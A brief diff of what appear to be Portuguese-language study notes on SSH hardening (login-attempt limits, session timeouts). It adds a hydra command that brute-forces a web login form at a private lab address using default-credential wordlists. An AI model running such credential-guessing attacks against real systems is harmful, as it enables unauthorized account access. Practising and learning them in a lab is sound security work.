@@ -124,3 +124,5 @@ MaxAuthTries 3 > limites tentativas de login
 Configurar Timeouts de Sessão
 ClientAliveInterval 300
 ClientAliveCountMax 0
+
+hydra -L /usr/share/wordlists/metasploit/http_default_users.txt -P /usr/share/wordlists/metasploit/http_default_pass.txt 192.168.56.101 http-post-form "/login.php:login=^USER^&senha=^PASS^:incorretos"
